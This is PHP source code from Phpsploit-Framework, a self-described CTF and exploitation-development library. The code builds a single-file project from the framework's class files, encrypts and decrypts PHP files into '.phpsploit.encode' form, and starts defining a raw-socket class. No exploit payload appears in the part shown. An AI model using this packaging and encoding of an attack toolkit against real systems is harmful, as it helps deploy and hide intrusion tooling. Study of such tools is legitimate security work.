                Class_Base_Response::outputln ( "\n" . ( 'Your current Phpsploit Framework software privilege account and its password content are still in an initialized state. Using an initial account and password to build a project poses significant security risks! For security reasons, the authors of the Phpsploit framework software prohibit the use of initial privileged accounts and passwords to build project files in the design of the Phpsploit framework software! Before building the project file, you need to modify the contents of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You can dynamically create and output new privileged account and password information using the "/user/create_production_privilege_user_password" interface! Note that the \'/user/create_production_privilege_user_password\' interface only outputs new privileged account and password information and does not truly change the values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You need to manually override the initial values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'at the code level, which are typically located in Phpsploit Framework software project directory  of \' index.php \'file .' ) . "\n" );
            } else {
                Class_Base_Response::output_textarea_inner_html ( $show_error_id , ( "\n" . ( 'Your current Phpsploit Framework software privilege account and its password content are still in an initialized state. Using an initial account and password to build a project poses significant security risks! For security reasons, the authors of the Phpsploit framework software prohibit the use of initial privileged accounts and passwords to build project files in the design of the Phpsploit framework software! Before building the project file, you need to modify the contents of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You can dynamically create and output new privileged account and password information using the "/user/create_production_privilege_user_password" interface! Note that the \'/user/create_production_privilege_user_password\' interface only outputs new privileged account and password information and does not truly change the values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You need to manually override the initial values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'at the code level, which are typically located in Phpsploit Framework software project directory  of \' index.php \'file .' ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            }
            return false;
        }
        if ( ! self::is_build_envement () ) {
            if ( is_cli () ) {
                Class_Base_Response::outputln ( "\n" . ( 'The phpsploit-framework software is in a non development environment and cannot build project files!' ) . "\n" );
            } else {
                Class_Base_Response::output_textarea_inner_html ( $show_error_id , ( "\n" . ( 'The phpsploit-framework software is in a non development environment and cannot build project files!' ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            }
            return false;
        }
        $_write_length = 0;
        if ( ! self::exist_new_file () ) {
            $_current_new_file = self::get_new_file_path ( "full" );
            if ( ! file_exists ( $_current_new_file ) ) {
                self::init_new_file ( $_current_new_file );
                self::create_new_file_in_extend_bases ( $_current_new_file , $_write_length , $show_result_id , $show_error_id );
                $_file_list = self::get_file_list ();
                if ( ( ! empty( $_file_list ) ) && ( is_array ( $_file_list ) ) ) {
                    foreach ( $_file_list as $index => $file_path ) {
                        $file_path                = str_replace ( "\\" , "/" , $file_path );
                        $_file_path_length        = strlen ( $file_path );
                        $_class_or_interface_name = self::get_class_or_interface_name_in_file_path ( $file_path );
                        if ( strcmp ( $_SERVER[ "SCRIPT_FILENAME" ] , $file_path ) != 0 ) {
                            $_file_path_separator_position = strripos ( $file_path , "/" );
                            if ( ( $_file_path_separator_position !== false ) && ( ( $_file_path_separator_position + 1 ) != $_file_path_length ) && ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 10 ) && ( ( substr ( $file_path , ( $_file_path_separator_position + 1 ) , 6 ) == "Class_" ) || ( substr ( $file_path , ( $_file_path_separator_position + 1 ) , 10 ) == "Interface_" ) ) && ( substr ( $file_path , - 4 , 4 ) == ".php" ) && ( ! in_array ( $_class_or_interface_name , self::$_base_interfaces ) ) && ( ! in_array ( $_class_or_interface_name , self::$_base_classes ) ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) ) {
                                $_file_size = filesize ( $file_path );
                                if ( ( $_file_size > 0 ) && ( $_file_size <= ( 1024 * 1024 * 10 ) ) ) {
                                    $_file_content        = @file_get_contents ( $file_path );
                                    $_file_content        = str_replace ( "<?php\n" , "" , $_file_content );
                                    $_file_content_length = strlen ( $_file_content );
                                    if ( ( $_file_content !== false ) && ( ! is_null ( $_file_content ) ) && ( is_string ( $_file_content ) ) && ( $_file_content_length > 0 ) ) {
                                        $_file_write_length = file_put_contents ( $_current_new_file , ( "\n" . $_file_content . "\n" ) , FILE_APPEND | LOCK_EX );
                                        if ( $_file_write_length !== false ) {
                                            $_write_length += $_file_write_length;
                                            if ( is_cli () ) {
                                                Class_Base_Response::outputln ( "\n" . ( 'Read ' . $_file_content_length . ' bytes from file ' . $file_path . ' and append them to file ' . $_current_new_file ) . "\n" );
                                            } else {
                                                Class_Base_Response::output_textarea_inner_html ( $show_result_id , ( "\n" . 'Read ' . $_file_content_length . ' bytes from file ' . $file_path . ' and append them to file ' . $_current_new_file . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                            }
                                        }
                                    }
                                }

                            } else {
                                if ( ( strcmp ( $_SERVER[ "SCRIPT_FILENAME" ] , $file_path ) != 0 ) && ( $file_path != $_current_new_file ) && ( ! in_array ( $_class_or_interface_name , self::$_base_interfaces ) ) && ( ! in_array ( $_class_or_interface_name , self::$_base_classes ) ) ) {
                                    if ( is_cli () ) {
                                        Class_Base_Response::outputln ( "\n" . ( $file_path . ' is not exist , or ' . $file_path . ' is not a php class and php interface file' ) . "\n" );
                                    } else {
                                        Class_Base_Response::output_textarea_inner_html ( $show_error_id , ( "\n" . $file_path . ' is not exist , or ' . $file_path . ' is not a php class and php interface file' . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    }
                                }
                            }
                        }
                    }
                    self::read_index_file_to_append_project_file ( $_current_new_file , $_write_length , $show_result_id , $show_error_id );
                    if ( file_exists ( $_current_new_file ) && is_file ( $_current_new_file ) ) {
                        if ( empty( self::$_current_new_file ) ) {
                            self::$_current_new_file = $_current_new_file;
                        }
                    }
                }
            }
        }
        if ( ( ! empty( $_write_length ) ) && ( ! empty( self::$_current_new_file ) ) ) {
            return self::$_current_new_file;
        }
        return false;
    }

    public static function create_new_lite_file ( $show_result_id = "show_result_id" , $show_error_id = "show_error_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( self::is_default_pivilege_user_password () ) {
            if ( is_cli () ) {
                Class_Base_Response::outputln ( "\n" . ( 'Your current Phpsploit Framework software privilege account and its password content are still in an initialized state. Using an initial account and password to build a project poses significant security risks! For security reasons, the authors of the Phpsploit framework software prohibit the use of initial privileged accounts and passwords to build project files in the design of the Phpsploit framework software! Before building the project file, you need to modify the contents of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You can dynamically create and output new privileged account and password information using the "/user/create_production_privilege_user_password" interface! Note that the \'/user/create_production_privilege_user_password\' interface only outputs new privileged account and password information and does not truly change the values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You need to manually override the initial values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'at the code level, which are typically located in Phpsploit Framework software project directory  of \' index.php \'file .' ) . "\n" );
            } else {
                Class_Base_Response::output_textarea_inner_html ( $show_error_id , ( "\n" . ( 'Your current Phpsploit Framework software privilege account and its password content are still in an initialized state. Using an initial account and password to build a project poses significant security risks! For security reasons, the authors of the Phpsploit framework software prohibit the use of initial privileged accounts and passwords to build project files in the design of the Phpsploit framework software! Before building the project file, you need to modify the contents of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You can dynamically create and output new privileged account and password information using the "/user/create_production_privilege_user_password" interface! Note that the \'/user/create_production_privilege_user_password\' interface only outputs new privileged account and password information and does not truly change the values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'! You need to manually override the initial values of the constants\' PRIVILEGE_USER_MODULE_USER and PRIVILEGE_USER_MODULE_PASSWORD \'at the code level, which are typically located in Phpsploit Framework software project directory  of \' index.php \'file .' ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            }
            return false;
        }
        if ( ! self::is_build_envement () ) {
            if ( is_cli () ) {
                Class_Base_Response::outputln ( "\n" . ( 'The phpsploit-framework software is in a non development environment and cannot build project files!' ) . "\n" );
            } else {
                Class_Base_Response::output_textarea_inner_html ( $show_error_id , ( "\n" . ( 'The phpsploit-framework software is in a non development environment and cannot build project files!' ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            }
            return false;
        }
        $_write_length = 0;
        if ( ! self::exist_new_file () ) {
            $_current_new_file = self::get_new_file_path ( "lite" );
            if ( ! file_exists ( $_current_new_file ) ) {
                self::init_new_file ( $_current_new_file );
                self::create_new_file_in_extend_bases ( $_current_new_file , $_write_length , $show_result_id , $show_error_id );
                $_file_list = self::get_file_list ();
                if ( ( ! empty( $_file_list ) ) && ( is_array ( $_file_list ) ) ) {
                    foreach ( $_file_list as $index => $file_path ) {
                        $file_path                = str_replace ( "\\" , "/" , $file_path );
                        $_file_path_length        = strlen ( $file_path );
                        $_class_or_interface_name = self::get_class_or_interface_name_in_file_path ( $file_path );
                        if ( strcmp ( $_SERVER[ "SCRIPT_FILENAME" ] , $file_path ) != 0 ) {
                            $_file_path_separator_position = strripos ( $file_path , "/" );
                            if ( ( $_file_path_separator_position !== false ) && ( ( $_file_path_separator_position + 1 ) != $_file_path_length ) && ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 10 ) && ( ( substr ( $file_path , ( $_file_path_separator_position + 1 ) , 6 ) == "Class_" ) || ( substr ( $file_path , ( $_file_path_separator_position + 1 ) , 10 ) == "Interface_" ) ) && ( substr ( $file_path , - 4 , 4 ) == ".php" ) && ( ! in_array ( $_class_or_interface_name , self::$_base_interfaces ) ) && ( ! in_array ( $_class_or_interface_name , self::$_base_classes ) ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) ) {
                                $_file_name = basename ( $file_path );
                                if ( ( strpos ( $_file_name , "Class_Controller_Guide" ) === false ) && ( strpos ( $_file_name , "Class_Controller_PenetrationTestCommands" ) === false ) ) {
                                    $_file_size = filesize ( $file_path );
                                    if ( ( $_file_size > 0 ) && ( $_file_size <= ( 1024 * 1024 * 10 ) ) ) {
                                        $_file_content        = @file_get_contents ( $file_path );
                                        $_file_content        = str_replace ( "<?php\n" , "" , $_file_content );
                                        $_file_content_length = strlen ( $_file_content );
                                        if ( ( $_file_content !== false ) && ( ! is_null ( $_file_content ) ) && ( is_string ( $_file_content ) ) && ( $_file_content_length > 0 ) ) {
                                            $_file_write_length = file_put_contents ( $_current_new_file , ( "\n" . $_file_content . "\n" ) , FILE_APPEND | LOCK_EX );
                                            if ( $_file_write_length !== false ) {
                                                $_write_length += $_file_write_length;
                                                if ( is_cli () ) {
                                                    Class_Base_Response::outputln ( "\n" . ( 'Read ' . $_file_content_length . ' bytes from file ' . $file_path . ' and append them to file ' . $_current_new_file ) . "\n" );
                                                } else {
                                                    Class_Base_Response::output_textarea_inner_html ( $show_result_id , ( "\n" . 'Read ' . $_file_content_length . ' bytes from file ' . $file_path . ' and append them to file ' . $_current_new_file . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                                }
                                            }
                                        }
                                    }
                                }

                            } else {
                                if ( ( strcmp ( $_SERVER[ "SCRIPT_FILENAME" ] , $file_path ) != 0 ) && ( $file_path != $_current_new_file ) && ( ! in_array ( $_class_or_interface_name , self::$_base_interfaces ) ) && ( ! in_array ( $_class_or_interface_name , self::$_base_classes ) ) ) {
                                    if ( is_cli () ) {
                                        Class_Base_Response::outputln ( "\n" . ( $file_path . ' is not exist , or ' . $file_path . ' is not a php class and php interface file' ) . "\n" );
                                    } else {
                                        Class_Base_Response::output_textarea_inner_html ( $show_error_id , ( "\n" . $file_path . ' is not exist , or ' . $file_path . ' is not a php class and php interface file' . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    }
                                }
                            }
                        }
                    }
                    self::read_index_file_to_append_project_file ( $_current_new_file , $_write_length , $show_result_id , $show_error_id );
                    if ( file_exists ( $_current_new_file ) && is_file ( $_current_new_file ) ) {
                        if ( empty( self::$_current_new_file ) ) {
                            self::$_current_new_file = $_current_new_file;
                        }
                    }
                }
            }
        }
        if ( ( ! empty( $_write_length ) ) && ( ! empty( self::$_current_new_file ) ) ) {
            return self::$_current_new_file;
        }
        return false;
    }

    public static function create_new_file_in_extend_bases ( $current_new_file , &$write_length , $show_result_id = "show_result_id" , $show_error_id = "show_error_id" )
    {
        self::read_interface_files_to_append_project_file ( $current_new_file , $write_length , $show_result_id , $show_error_id );

        self::read_class_files_to_append_project_file ( $current_new_file , $write_length , $show_result_id , $show_error_id );

        if ( ! empty( $write_length ) ) {
            return $current_new_file;
        }

        return false;
    }

    public static function read_interface_files_to_append_project_file ( $current_new_file , &$write_length , $show_result_id , $show_error_id )
    {
        foreach ( self::$_base_interfaces as $index => $interface_name ) {
            self::read_interface_file_to_append_project_file_by_interface_name ( $interface_name , $current_new_file , $write_length , $show_result_id , $show_error_id );
        }
    }

    public static function read_class_files_to_append_project_file ( $current_new_file , &$write_length , $show_result_id , $show_error_id )
    {
        foreach ( self::$_base_classes as $index => $class_name ) {
            self::read_class_file_to_append_project_file_by_class_name ( $class_name , $current_new_file , $write_length , $show_result_id , $show_error_id );
        }
    }

    public static function read_index_file_to_append_project_file ( $current_new_file , &$write_length , $show_result_id , $show_error_id )
    {
        $_index_name = 'index';
        self::read_index_file_to_append_project_file_by_index_name ( $_index_name , $current_new_file , $write_length , $show_result_id , $show_error_id );
    }

    public static function read_interface_file_to_append_project_file_by_interface_name ( $interface_name , $current_new_file , &$write_length , $show_result_id = "show_result_id" , $show_error_id = "show_error_id" )
    {
        if ( ! is_integer ( $write_length ) ) {
            $write_length = 0;
        }
        $_current_directory = self::get_current_directory ();
        $_interface_file    = ( $_current_directory . chr ( 47 ) . $interface_name . ( ".php" ) );
        if ( ( ! file_exists ( $_interface_file ) ) || ( ! is_file ( $_interface_file ) ) ) {
            throw new \Exception( "Interface file " . $_interface_file . " is not exist , or " . $_interface_file . " is not a file ! " , 0 );
        } else {
            $_file_content        = @file_get_contents ( $_interface_file );
            $_file_content        = str_replace ( "<?php\n" , "" , $_file_content );
            $_file_content_length = strlen ( $_file_content );
            $_file_write_length   = file_put_contents ( $current_new_file , ( "\n" . $_file_content . "\n" ) , FILE_APPEND | LOCK_EX );
            if ( $_file_write_length !== false ) {
                $write_length += $_file_write_length;
                if ( is_cli () ) {
                    Class_Base_Response::outputln ( "\n" . ( 'Read ' . $_file_content_length . ' bytes from file ' . $_interface_file . ' and append them to file ' . $current_new_file ) . "\n" );
                } else {
                    Class_Base_Response::output_textarea_inner_html ( $show_result_id , ( "\n" . 'Read ' . $_file_content_length . ' bytes from file ' . $_interface_file . ' and append them to file ' . $current_new_file . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                }
            }
        }
    }

    public static function read_class_file_to_append_project_file_by_class_name ( $class_name , $current_new_file , &$write_length , $show_result_id = "show_result_id" , $show_error_id = "show_error_id" )
    {
        if ( ! is_integer ( $write_length ) ) {
            $write_length = 0;
        }
        $_current_directory = self::get_current_directory ();
        $_class_file        = ( $_current_directory . chr ( 47 ) . $class_name . ( ".php" ) );
        if ( ( ! file_exists ( $_class_file ) ) || ( ! is_file ( $_class_file ) ) ) {
            throw new \Exception( "Class file " . $_class_file . " is not exist , or " . $_class_file . " is not a file ! " , 0 );
        } else {
            $_file_content        = @file_get_contents ( $_class_file );
            $_file_content        = str_replace ( "<?php\n" , "" , $_file_content );
            $_file_content_length = strlen ( $_file_content );
            $_file_write_length   = file_put_contents ( $current_new_file , ( "\n" . $_file_content . "\n" ) , FILE_APPEND | LOCK_EX );
            if ( $_file_write_length !== false ) {
                $write_length += $_file_write_length;
                if ( is_cli () ) {
                    Class_Base_Response::outputln ( "\n" . ( 'Read ' . $_file_content_length . ' bytes from file ' . $_class_file . ' and append them to file ' . $current_new_file ) . "\n" );
                } else {
                    Class_Base_Response::output_textarea_inner_html ( $show_result_id , ( "\n" . 'Read ' . $_file_content_length . ' bytes from file ' . $_class_file . ' and append them to file ' . $current_new_file . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                }
            }
        }
    }

    public static function read_index_file_to_append_project_file_by_index_name ( $index_name , $current_new_file , &$write_length , $show_result_id = "show_result_id" , $show_error_id = "show_error_id" )
    {
        if ( ! is_integer ( $write_length ) ) {
            $write_length = 0;
        }
        $_current_directory = self::get_current_directory ();
        $_index_file        = ( $_current_directory . chr ( 47 ) . $index_name . ( ".php" ) );
        if ( ( ! file_exists ( $_index_file ) ) || ( ! is_file ( $_index_file ) ) ) {
            throw new \Exception( "Index file " . $_index_file . " is not exist , or " . $_index_file . " is not a file ! " , 0 );
        } else {
            $_file_content        = @file_get_contents ( $_index_file );
            $_file_content        = str_replace ( "<?php\n" , "" , $_file_content );
            $_file_content_length = strlen ( $_file_content );
            $_file_write_length   = file_put_contents ( $current_new_file , ( "\n" . $_file_content . "\n" ) , FILE_APPEND | LOCK_EX );
            if ( $_file_write_length !== false ) {
                $write_length += $_file_write_length;
                if ( is_cli () ) {
                    Class_Base_Response::outputln ( "\n" . ( 'Read ' . $_file_content_length . ' bytes from file ' . $_index_file . ' and append them to file ' . $current_new_file ) . "\n" );
                } else {
                    Class_Base_Response::output_textarea_inner_html ( $show_result_id , ( "\n" . 'Read ' . $_file_content_length . ' bytes from file ' . $_index_file . ' and append them to file ' . $current_new_file . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                }
            }
        }
    }

    public static function create_new_encode_file ( $input_file_path , $save_directory_path , &$output_file_path , &$encode_key , &$encode_iv_base64 )
    {
        if ( is_string ( $input_file_path ) ) {
            $input_file_path = trim ( $input_file_path );
        }
        if ( is_string ( $save_directory_path ) ) {
            $save_directory_path = trim ( $save_directory_path );
        }
        if ( ( is_string ( $input_file_path ) ) && ( strlen ( $input_file_path ) < 256 ) && ( file_exists ( $input_file_path ) ) && ( is_file ( $input_file_path ) ) ) {
            if ( ( is_string ( $save_directory_path ) ) && ( strlen ( $save_directory_path ) < 256 ) && ( file_exists ( $save_directory_path ) ) && ( is_dir ( $save_directory_path ) ) ) {
                $_new_encode_file_name = ( ( md5 ( time () . rand ( 10000000 , 99999999 ) ) ) . '.phpsploit.encode' );
                $_new_encode_file      = ( $save_directory_path . '/' . $_new_encode_file_name );
                $_input_file_size      = ( filesize ( $input_file_path ) );
                if ( ( $_input_file_size < ( 1024 * 1024 * 100 ) ) ) {
                    $_read_file_pointer = fopen ( $input_file_path , "r" );
                    if ( ! empty( $_read_file_pointer ) ) {
                        $_read_file_content_size   = ( 1024 );
                        $_read_file_content_offset = 0;
                        $_read_file_content        = "";
                        for ( $read_file_content_index = 0 ; $read_file_content_index < $_input_file_size ; $read_file_content_index += $_read_file_content_size ) {
                            $_read_file_content           .= fread ( $_read_file_pointer , 1024 );
                            $_read_file_content_offset    += 1024;
                            $_reand_file_move_offset_flag = fseek ( $_read_file_pointer , $_read_file_content_offset );
                            if ( $_reand_file_move_offset_flag == - 1 ) {
                                fclose ( $_read_file_pointer );
                                break;
                            }
                        }
                        $encode_key           = ( time () . rand ( 100000 , 999999 ) );
                        $encode_iv            = openssl_random_pseudo_bytes ( openssl_cipher_iv_length ( "AES-256-CBC" ) );
                        $encode_iv_base64     = base64_encode ( $encode_iv );
                        $_encode_content      = Class_Base_Security::phpsploit_encode ( $_read_file_content , $encode_key , $encode_iv );
                        $_encode_content_size = strlen ( $_encode_content );
                        if ( ( ! file_exists ( $_new_encode_file ) ) ) {
                            $_write_file_pointer = fopen ( $_new_encode_file , "w" );
                            if ( ( empty( $_write_file_pointer ) ) ) {
                                return false;
                            }
                            $_write_file_content_block_size = ( 1024 );
                            for ( $encode_content_index = 0 ; $encode_content_index < $_encode_content_size ; $encode_content_index += $_write_file_content_block_size ) {
                                $_encode_content_block = substr ( $_encode_content , $encode_content_index , $_write_file_content_block_size );
                                $_bytes                = fwrite ( $_write_file_pointer , $_encode_content_block );
                                if ( $_bytes === false ) {
                                    fclose ( $_write_file_pointer );
                                    return false;
                                }
                            }
                            fclose ( $_write_file_pointer );
                            $output_file_path = $_new_encode_file;
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    public static function create_new_decode_php_file ( $input_file_path , $save_directory_path , &$output_file_path , $encode_key , $encode_iv_base64 )
    {
        if ( is_string ( $input_file_path ) ) {
            $input_file_path = trim ( $input_file_path );
        }
        if ( is_string ( $save_directory_path ) ) {
            $save_directory_path = trim ( $save_directory_path );
        }
        if ( ( ! is_string ( $input_file_path ) ) || ( strlen ( $input_file_path ) < 49 ) || ( substr ( $input_file_path , - 17 , 17 ) != ".phpsploit.encode" ) || ( ! file_exists ( $input_file_path ) ) || ( ! is_file ( $input_file_path ) ) ) {
            return false;
        }
        if ( ( is_string ( $input_file_path ) ) && ( strlen ( $input_file_path ) < 256 ) && ( file_exists ( $input_file_path ) ) && ( is_file ( $input_file_path ) ) ) {
            if ( ( is_string ( $save_directory_path ) ) && ( strlen ( $save_directory_path ) < 256 ) && ( file_exists ( $save_directory_path ) ) && ( is_dir ( $save_directory_path ) ) ) {
                $_new_decode_file_name = ( ( md5 ( time () . rand ( 10000000 , 99999999 ) ) ) . '.phpsploit.php' );
                $_new_decode_file      = ( $save_directory_path . '/' . $_new_decode_file_name );
                $_input_file_size      = ( filesize ( $input_file_path ) );
                if ( ( $_input_file_size < ( 1024 * 1024 * 100 ) ) ) {
                    $_read_file_pointer = fopen ( $input_file_path , "r" );
                    if ( ! empty( $_read_file_pointer ) ) {
                        $_read_file_content_size   = ( 1024 );
                        $_read_file_content_offset = 0;
                        $_read_file_content        = "";
                        for ( $read_file_content_index = 0 ; $read_file_content_index < $_input_file_size ; $read_file_content_index += $_read_file_content_size ) {
                            $_read_file_content           .= fread ( $_read_file_pointer , 1024 );
                            $_read_file_content_offset    += 1024;
                            $_reand_file_move_offset_flag = fseek ( $_read_file_pointer , $_read_file_content_offset );
                            if ( $_reand_file_move_offset_flag == - 1 ) {
                                fclose ( $_read_file_pointer );
                                break;
                            }
                        }
                        $encode_iv            = base64_decode ( $encode_iv_base64 );
                        $_decode_content      = Class_Base_Security::phpsploit_decode ( $_read_file_content , $encode_key , $encode_iv );
                        $_decode_content_size = strlen ( $_decode_content );
                        if ( ( ! file_exists ( $_new_decode_file ) ) ) {
                            $_write_file_pointer = fopen ( $_new_decode_file , "w" );
                            if ( ( empty( $_write_file_pointer ) ) ) {
                                return false;
                            }
                            $_write_file_content_block_size = ( 1024 );
                            for ( $decode_content_index = 0 ; $decode_content_index < $_decode_content_size ; $decode_content_index += $_write_file_content_block_size ) {
                                $_encode_content_block = substr ( $_decode_content , $decode_content_index , $_write_file_content_block_size );
                                $_bytes                = fwrite ( $_write_file_pointer , $_encode_content_block );
                                if ( $_bytes === false ) {
                                    fclose ( $_write_file_pointer );
                                    return false;
                                }
                            }
                            fclose ( $_write_file_pointer );
                            $output_file_path = $_new_decode_file;
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }
}


/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23_1_24
 * Time: 上午11:36
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_RawSocket extends Class_Base implements Interface_Base_RawSocket
{
    const KEY_LOCAL_DOCKER         = "127.0.0.1:0_127.0.0.1:0";
    const DOMAIN_IPV4              = AF_INET;
    const DOMAIN_IPV6              = AF_INET6;
    const TYPE_RAW                 = SOCK_RAW;
    const PROTOCOL_IP              = 0;
    const PROTOCOL_ICMP            = 1;
    const PROTOCOL_IGMP            = 2;
    const PROTOCOL_GGP             = 3;
    const PROTOCOL_IPENCAP         = 4;
    const PROTOCOL_ST              = 5;
    const PROTOCOL_TCP             = 6;
    const PROTOCOL_EGP             = 8;
    const PROTOCOL_IGP             = 9;
    const PROTOCOL_PUP             = 12;
    const PROTOCOL_UDP             = 17;
    const PROTOCOL_HMP             = 20;
    const PROTOCOL_XNS_IDP         = 22;
    const PROTOCOL_RDP             = 27;
    const PROTOCOL_ISO_TP4         = 29;
    const PROTOCOL_DCCP            = 33;
    const PROTOCOL_XTP             = 36;
    const PROTOCOL_DDP             = 37;
    const PROTOCOL_IDPR_CMTP       = 38;
    const PROTOCOL_IPV6            = 41;
    const PROTOCOL_IPV6_ROUTE      = 43;
    const PROTOCOL_IPV6_FRAG       = 44;
    const PROTOCOL_IDRP            = 45;
    const PROTOCOL_RSVP            = 46;
    const PROTOCOL_GRE             = 47;
    const PROTOCOL_ESP             = 50;
    const PROTOCOL_AH              = 51;
    const PROTOCOL_SKIP            = 57;
    const PROTOCOL_IPV6_ICMP       = 58;
    const PROTOCOL_IPV6_NONXT      = 59;
    const PROTOCOL_IPV6_OPTS       = 60;
    const PROTOCOL_RSPF            = 73;
    const PROTOCOL_VMTP            = 81;
    const PROTOCOL_EIGRP           = 88;
    const PROTOCOL_OSPF            = 89;
    const PROTOCOL_AX_25           = 93;
    const PROTOCOL_IPIP            = 94;
    const PROTOCOL_ETHERIP         = 97;
    const PROTOCOL_ENCAP           = 98;
    const PROTOCOL_PIM             = 103;
    const PROTOCOL_IPCOMP          = 108;
    const PROTOCOL_VRRP            = 112;
    const PROTOCOL_L2TP            = 115;
    const PROTOCOL_ISIS            = 124;
    const PROTOCOL_SCTP            = 132;
    const PROTOCOL_FC              = 133;
    const PROTOCOL_MOBILITY_HEADER = 135;
    const PROTOCOL_UDPLITE         = 136;
    const PROTOCOL_MPLS_IN_IP      = 137;
    const PROTOCOL_MANET           = 138;
    const PROTOCOL_HIP             = 139;
    const PROTOCOL_SHIM6           = 140;
    const PROTOCOL_WESP            = 141;
    const PROTOCOL_ROHC            = 142;

    const ADDRESS_IPV6_INTERNAL               = "::1";
    const ADDRESS_IPV6_PUBLIC_DOCKER_DEFAULT  = "2001:db8:1::242:ac11:2";
    const ADDRESS_IPV6_PRIVATE_DOCKER_DEFAULT = "fe80::42:acff:fe11:2";
    const ADDRESS_IPV4_INTERNAL               = "127.0.0.1";
    const ADDRESS_IPV4_PUBLIC_DOCKER_DEFAULT  = "172.17.0.2";
    const ADDRESS_IPV4_PRIVATE_DOCKER_DEFAULT = "127.0.0.1";

    const SIZE_RECEIVE_BYTE_MAX = 1024;

    const SIZE_BIT_IPV6_HEAD_VERSION             = 4;
    const SIZE_BIT_IPV6_HEAD_TRAFFIC             = 8;
    const SIZE_BIT_IPV6_FLOW_LABEL               = 20;
    const SIZE_BIT_IPV6_HEAD_PAYLOAD_LENGTH      = 16;
    const SIZE_BIT_IPV6_HEAD_NEXT_HEADER         = 8;
    const SIZE_BIT_IPV6_HEAD_HOP_LIMIT           = 8;
    const SIZE_BIT_IPV6_HEAD_SOURCE_ADDRESS      = 128;
    const SIZE_BIT_IPV6_HEAD_DESTINATION_ADDRESS = 128;

    const SIZE_BYTE_IPV6      = 1024;
    const SIZE_BYTE_IPV6_HEAD = 40;
    const SIZE_BYTE_IPV6_DATA = 984;

    const SIZE_BYTE_BIT_IPV6_0_TO_1023   = 1024;
    const SIZE_BYTE_BIT_IPV6_0_TO_31     = 4;
    const SIZE_BYTE_BIT_IPV6_32_TO_63    = 4;
    const SIZE_BYTE_BIT_IPV6_64_TO_191   = 16;
    const SIZE_BYTE_BIT_IPV6_192_TO_319  = 16;
    const SIZE_BYTE_BIT_IPV6_320_TO_8191 = 984;

    const SIZE_BIT_IPV6      = 8192;
    const SIZE_BIT_IPV6_HEAD = 320;
    const SIZE_BIT_IPV6_DATA = 7872;

    const SIZE_BIT_IPV6_0_TO_8191   = 8192;
    const SIZE_BIT_IPV6_0_TO_31     = 32;
    const SIZE_BIT_IPV6_32_TO_63    = 32;
    const SIZE_BIT_IPV6_64_TO_191   = 128;
    const SIZE_BIT_IPV6_192_TO_319  = 128;
    const SIZE_BIT_IPV6_320_TO_8191 = 7872;

    const SIZE_BIT_IPV6_0_TO_3   = 4;
    const SIZE_BIT_IPV6_4_TO_11  = 8;
    const SIZE_BIT_IPV6_12_TO_31 = 20;
    const SIZE_BIT_IPV6_32_TO_47 = 16;
    const SIZE_BIT_IPV6_48_TO_55 = 8;
    const SIZE_BIT_IPV6_56_TO_63 = 8;

    const VALUE_BIT_IPV6_HEAD_PAYLOAD_LENGTH      = 0b0000001111011000;
    const VALUE_BIT_IPV6_HEAD_NEXT_HEADER         = 0b10011001;
    const VALUE_BIT_IPV6_HEAD_HOP_LIMIT           = 0b11111111;
    const VALUE_BIT_IPV6_HEAD_SOURCE_ADDRESS      = self::ADDRESS_IPV6_INTERNAL;
    const VALUE_BIT_IPV6_HEAD_DESTINATION_ADDRESS = self::ADDRESS_IPV6_INTERNAL;

    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
